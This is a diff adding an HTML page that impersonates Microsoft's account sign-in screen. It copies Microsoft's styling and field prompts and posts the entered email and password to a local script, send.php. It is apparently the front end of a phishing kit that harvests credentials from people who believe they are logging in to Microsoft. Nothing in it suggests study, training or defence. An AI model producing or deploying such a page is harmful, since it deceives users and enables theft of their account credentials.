@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in to your Microsoft account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: 'Segoe UI'; background: #f3f3f3; text-align: center; padding-top: 100px; }
+    form { background: white; padding: 30px; width: 320px; margin: auto; border-radius: 5px; box-shadow: 0 0 10px #ccc; }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #aaa; border-radius: 5px; }
+    .btn { background: #0067b8; color: white; border: none; padding: 10px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <form action="send.php" method="POST">
+    <h3>Sign in</h3>
+    <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <input type="submit" class="btn" value="Next">
+  </form>
+</body>
+</html>
